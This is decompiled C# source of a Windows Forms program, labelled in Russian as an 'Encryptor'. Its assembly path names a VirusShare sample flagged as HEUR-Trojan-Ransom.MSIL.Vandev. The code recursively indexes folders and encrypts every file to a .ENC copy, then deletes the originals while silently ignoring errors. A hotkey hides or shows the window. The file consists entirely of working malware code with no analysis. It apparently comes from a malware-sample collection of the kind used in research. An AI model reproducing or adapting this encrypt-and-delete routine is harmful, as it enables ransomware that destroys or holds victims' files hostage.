// Decompiled with JetBrains decompiler
// Type: Encoder.Form1
// Assembly: Encoder, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D7B13CBC-2366-492E-B5DA-029184656753
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00080-msil\HEUR-Trojan-Ransom.MSIL.Vandev.a-f8382b56ece03e771bbb5ebac0169d2b845be7709dcf277b538a1c25b641c46f.exe

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Encoder
{
  public class Form1 : Form
  {
    private BackgroundWorker IndexWorker = new BackgroundWorker();
    private BackgroundWorker EncrypterWorker = new BackgroundWorker();
    private string password = "";
    public string Path = "";
    public static List<Direct> Paths;
    private IContainer components = (IContainer) null;
    private TextBox textBox1;
    private TextBox textBox2;
    private Label label1;
    private Label label2;
    private Button button5;
    private Button button6;
    private Button button7;

    [DllImport("User32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool RegisterHotKey(IntPtr hWnd, int id, uint fsModifiers, uint vk);

    [DllImport("User32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool UnregisterHotKey(IntPtr hWnd, int id);

    public Form1()
    {
      Form1.Paths = new List<Direct>();
      this.InitializeComponent();
      this.IndexWorker.ProgressChanged += new ProgressChangedEventHandler(this.IndexProgressChanged);
      this.IndexWorker.DoWork += new DoWorkEventHandler(this.GetDirectories);
      this.IndexWorker.RunWorkerCompleted += new RunWorkerCompletedEventHandler(this.IndexCompleted);
      this.EncrypterWorker.WorkerReportsProgress = true;
      this.EncrypterWorker.ProgressChanged += new ProgressChangedEventHandler(this.EncryptionProgressChanged);
      this.EncrypterWorker.DoWork += new DoWorkEventHandler(this.EncryptFiles);
      if (Form1.RegisterHotKey(this.Handle, 0, 5U, 118U))
        ;
    }

    private void EncryptionProgressChanged(object sender, ProgressChangedEventArgs e)
    {
      if (e.ProgressPercentage == 1)
        this.label1.Text = ((int) e.UserState).ToString();
      else
        this.label2.Text = "Complete";
    }

    private void EncryptFiles(object sender, DoWorkEventArgs e)
    {
      int userState = 0;
      BackgroundWorker backgroundWorker = sender as BackgroundWorker;
      foreach (Direct path in Form1.Paths)
      {
        foreach (string file in path.Files)
        {
          try
          {
            EncDec.Encrypt(path.FullPath + "/" + file, path.FullPath + "/" + file + ".ENC", this.password);
            File.Delete(path.FullPath + "/" + file);
            ++userState;
            backgroundWorker.ReportProgress(1, (object) userState);
          }
          catch (Exception ex)
          {
          }
        }
      }
      backgroundWorker.ReportProgress(2, (object) userState);
    }

    private void IndexProgressChanged(object sender, ProgressChangedEventArgs e)
    {
    }

    protected override void WndProc(ref Message m)
    {
      if (m.Msg == 786)
      {
        if (this.Visible)
          this.Visible = false;
        else
          this.Visible = true;
      }
      base.WndProc(ref m);
    }

    public void EncryptFile(string path)
    {
      try
      {
        EncDec.Encrypt(path, path + ".ENC", this.textBox1.Text);
      }
      catch (Exception ex)
      {
      }
    }

    public void GetDirectories(string path)
    {
      DirectoryInfo directoryInfo = new DirectoryInfo(path);
      Direct direct = new Direct();
      direct.LocalPath = directoryInfo.FullName.Remove(0, this.Path.Length);
      direct.FullPath = directoryInfo.FullName;
      try
      {
        FileInfo[] files = directoryInfo.GetFiles();
        direct.Files = new List<string>();
        foreach (FileInfo fileInfo in files)
        {
          if (fileInfo.Name.Substring(fileInfo.Name.Length - 3, 3) != "ENC")
            direct.Files.Add(fileInfo.Name);
        }
        Form1.Paths.Add(direct);
      }
      catch (Exception ex)
      {
      }
      foreach (DirectoryInfo directory in directoryInfo.GetDirectories())
      {
        if (directory.Attributes.ToString().Contains("Directory"))
        {
          try
          {
            this.GetDirectories(directory.FullName);
          }
          catch (Exception ex)
          {
          }
        }
      }
    }

    private void button5_Click(object sender, EventArgs e)
    {
      FolderBrowserDialog folderBrowserDialog = new FolderBrowserDialog();
      if (folderBrowserDialog.ShowDialog() != DialogResult.OK)
        return;
      this.Path = folderBrowserDialog.SelectedPath;
      this.IndexWorker.RunWorkerAsync();
      this.label2.Text = "Indexing...";
    }

    private void IndexCompleted(object sender, RunWorkerCompletedEventArgs e)
    {
      int num = 0;
      foreach (Direct path in Form1.Paths)
      {
        foreach (string file in path.Files)
        {
          ++num;
          this.textBox2.AppendText(path.FullPath + "\\" + file + "\r\n");
        }
      }
      this.label2.Text = num.ToString();
    }

    private void GetDirectories(object sender, DoWorkEventArgs e) => this.GetDirectories(this.Path);

    private void button6_Click(object sender, EventArgs e)
    {
      FileDialog fileDialog = (FileDialog) new OpenFileDialog();
      if (fileDialog.ShowDialog() != DialogResult.OK)
        return;
      foreach (string fileName in fileDialog.FileNames)
      {
        Direct direct = new Direct();
        FileInfo fileInfo = new FileInfo(fileName);
        direct.FullPath = fileInfo.DirectoryName;
        direct.Files = new List<string>();
        direct.Files.Add(fileInfo.Name);
        Form1.Paths.Add(direct);
        this.textBox2.AppendText(fileName + "\r\n");
      }
    }

    private void button7_Click(object sender, EventArgs e)
    {
      this.password = this.textBox1.Text;
      this.EncrypterWorker.RunWorkerAsync();
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.textBox1 = new TextBox();
      this.textBox2 = new TextBox();
      this.label1 = new Label();
      this.label2 = new Label();
      this.button5 = new Button();
      this.button6 = new Button();
      this.button7 = new Button();
      this.SuspendLayout();
      this.textBox1.Location = new Point(199, 272);
      this.textBox1.Name = "textBox1";
      this.textBox1.Size = new Size(206, 20);
      this.textBox1.TabIndex = 1;
      this.textBox2.Location = new Point(12, 12);
      this.textBox2.Multiline = true;
      this.textBox2.Name = "textBox2";
      this.textBox2.ReadOnly = true;
      this.textBox2.ScrollBars = ScrollBars.Vertical;
      this.textBox2.Size = new Size(399, 191);
      this.textBox2.TabIndex = 3;
      this.label1.AutoSize = true;
      this.label1.Location = new Point(13, 210);
      this.label1.Name = "label1";
      this.label1.Size = new Size(13, 13);
      this.label1.TabIndex = 6;
      this.label1.Text = "0";
      this.label2.AutoSize = true;
      this.label2.Location = new Point(13, 223);
      this.label2.Name = "label2";
      this.label2.Size = new Size(13, 13);
      this.label2.TabIndex = 7;
      this.label2.Text = "0";
      this.button5.Location = new Point(16, 240);
      this.button5.Name = "button5";
      this.button5.Size = new Size(176, 23);
      this.button5.TabIndex = 8;
      this.button5.Text = "Проиндексировать папку";
      this.button5.UseVisualStyleBackColor = true;
      this.button5.Click += new EventHandler(this.button5_Click);
      this.button6.Location = new Point(199, 240);
      this.button6.Name = "button6";
      this.button6.Size = new Size(206, 23);
      this.button6.TabIndex = 9;
      this.button6.Text = "Добавить файл";
      this.button6.UseVisualStyleBackColor = true;
      this.button6.Click += new EventHandler(this.button6_Click);
      this.button7.Location = new Point(16, 270);
      this.button7.Name = "button7";
      this.button7.Size = new Size(176, 23);
      this.button7.TabIndex = 10;
      this.button7.Text = "Зишифровать файлы";
      this.button7.UseVisualStyleBackColor = true;
      this.button7.Click += new EventHandler(this.button7_Click);
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(417, 305);
      this.Controls.Add((Control) this.button7);
      this.Controls.Add((Control) this.button6);
      this.Controls.Add((Control) this.button5);
      this.Controls.Add((Control) this.label2);
      this.Controls.Add((Control) this.label1);
      this.Controls.Add((Control) this.textBox2);
      this.Controls.Add((Control) this.textBox1);
      this.Name = nameof (Form1);
      this.Text = "Шифратор";
      this.ResumeLayout(false);
      this.PerformLayout();
    }
  }
}
